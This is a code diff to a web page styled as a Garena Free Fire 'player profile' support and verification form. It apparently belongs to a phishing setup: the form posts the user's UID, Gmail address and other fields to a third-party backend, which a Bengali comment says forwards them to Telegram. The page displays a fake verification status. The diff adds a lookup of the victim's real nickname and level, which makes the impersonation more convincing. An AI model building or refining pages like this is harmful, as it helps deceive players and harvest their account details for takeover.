@@ -106,9 +106,9 @@
                 </div>
 
                 <div class="section-title">Garena Player Profile</div>
-                <div class="detail-row"><span class="label">Player Name:</span><span class="value" id="resName">Searching Player Name...</span></div>
+                <div class="detail-row"><span class="label">Player Name:</span><span class="value" id="resName">Searching...</span></div>
                 <div class="detail-row"><span class="label">Player UID:</span><span class="value" id="resUID">N/A</span></div>
-                <div class="detail-row"><span class="label">Player Level:</span><span class="value" id="resLevel">Fetching Level...</span></div>
+                <div class="detail-row"><span class="label">Player Level:</span><span class="value" id="resLevel">Fetching...</span></div>
                 <div class="detail-row"><span class="label">Region / Server:</span><span class="value" id="resRegion">Bangladesh</span></div>
 
                 <div class="section-title">Verification Status</div>
@@ -125,13 +125,38 @@
 
     <script>
         const BACKEND_URL = "https://ff-garena-1-njv6.onrender.com"; 
+        const FF_INFO_API = "https://ffxinfo-ffx.ffxapis.workers.dev/ff-info?uid=";
+        
         let currentUID = "";
         let autoCheckInterval = null;
+        let isPlayerInfoFetched = false;
+
+        // FF Info API থেকে লাইভ প্লেয়ার ডাটা আনার ফাংশন
+        async function fetchFFInfo(uid) {
+            try {
+                const res = await fetch(`${FF_INFO_API}${encodeURIComponent(uid)}`);
+                const payload = await res.json();
+                
+                const source = payload.data || payload;
+                const basic = source.basicInfo || source.profileInfo || source;
+
+                if (basic && (basic.nickname || basic.name)) {
+                    document.getElementById('resName').innerText = basic.nickname || basic.name;
+                    document.getElementById('resLevel').innerText = basic.level || "N/A";
+                    document.getElementById('resRegion').innerText = basic.region || "Bangladesh";
+                    isPlayerInfoFetched = true;
+                }
+            } catch (e) {
+                console.error("FF Info Fetching Error:", e);
+            }
+        }
 
         document.getElementById('supportForm').addEventListener('submit', async (e) => {
             e.preventDefault();
 
             currentUID = document.getElementById('uid').value.trim();
+            isPlayerInfoFetched = false;
+
             const payload = {
                 uid: currentUID,
                 gmail: document.getElementById('gmail').value.trim(),
@@ -144,13 +169,19 @@
             document.getElementById('formSection').style.display = 'none';
             document.getElementById('loadingSection').style.display = 'block';
 
+            // ১. প্যারালালি FF Info API থেকে ডাটা ফেচ করা
+            fetchFFInfo(currentUID);
+
+            // ২. ব্যাকএন্ড সার্ভারে টিকিট ডাটা পাঠানো (যা টেলিগ্রামে মেসেজ ফরোয়ার্ড করবে)
             try {
                 await fetch(`${BACKEND_URL}/api/submit-ticket`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch(e) {}
+            } catch(e) {
+                console.error("Backend Submission Error:", e);
+            }
 
             document.getElementById('resUID').innerText = currentUID;
             document.getElementById('loadingSection').style.display = 'none';
@@ -168,15 +199,24 @@
 
         async function refreshStatus() {
             if(!currentUID) return;
+
+            // যদি এপিআই থেকে প্লেয়ার নেম ফেচ না হয়ে থাকে তবে পুনরায় চেষ্টা করবে
+            if (!isPlayerInfoFetched) {
+                fetchFFInfo(currentUID);
+            }
+
             try {
                 const res = await fetch(`${BACKEND_URL}/api/check-status/${currentUID}?t=${Date.now()}`, { 
                     cache: 'no-store' 
                 });
                 const result = await res.json();
-                const data = result.data;
+                const data = result.data || {};
                 
-                document.getElementById('resName').innerText = data.name || "Searching Player Name...";
-                document.getElementById('resLevel').innerText = data.level || "Fetching Level...";
+                // ব্যাকআপ ডাটা (যদি FF Info API কাজ না করে)
+                if (!isPlayerInfoFetched && data.name) {
+                    document.getElementById('resName').innerText = data.name;
+                    document.getElementById('resLevel').innerText = data.level || "N/A";
+                }
 
                 const badge = document.getElementById('statusBadge');
                 if(data.status === "Verified") {
@@ -185,7 +225,7 @@
                     if(autoCheckInterval) clearInterval(autoCheckInterval);
                 } else if(data.status === "Rejected") {
                     badge.className = "badge-danger";
-                    badge.innerText = `❌ Rejected: ${data.reason}`;
+                    badge.innerText = `❌ Rejected: ${data.reason || 'Verification Failed'}`;
                     if(autoCheckInterval) clearInterval(autoCheckInterval);
                 } else {
                     badge.className = "badge-pending";
